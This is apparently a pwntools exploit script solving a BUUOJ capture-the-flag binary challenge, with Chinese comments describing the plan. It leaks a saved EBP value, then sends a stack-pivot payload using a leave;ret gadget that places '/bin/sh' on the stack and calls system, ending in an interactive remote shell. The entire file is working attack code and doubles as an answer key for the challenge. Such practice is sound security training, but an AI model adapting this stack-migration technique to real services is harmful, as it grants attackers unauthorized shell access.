from pwn import *

p = remote('node4.buuoj.cn', 25991)
context(os= 'linux', arch='i386')
# context.log_level = 'debug'

# 有两次输入输出的机会，肯定是泄露栈上的某个内容，然后再操作
# 我想到了，泄露ebp，然后直接在vuln的栈上做栈迁移，写入/bin/sh，然后调用system
call_system = 0x8048559
leave_ret = 0x80484b8
p.send(b'a'*0x20)
p.recvuntil(b'Hello, ' + b'a'*0x20)
vuln_ebp = u32(p.recv(12)[-4:]) - 0x10 # gdb调试
# p.info(hex(vuln_ebp))

payload = (p32(0xdeadbeef) + p32(call_system) + p32(vuln_ebp-0x28+0xc) + b'/bin/sh\x00').ljust(0x28, b'a') + p32(vuln_ebp-0x28) + p32(leave_ret)
p.sendline(payload)
p.interactive()

# It works!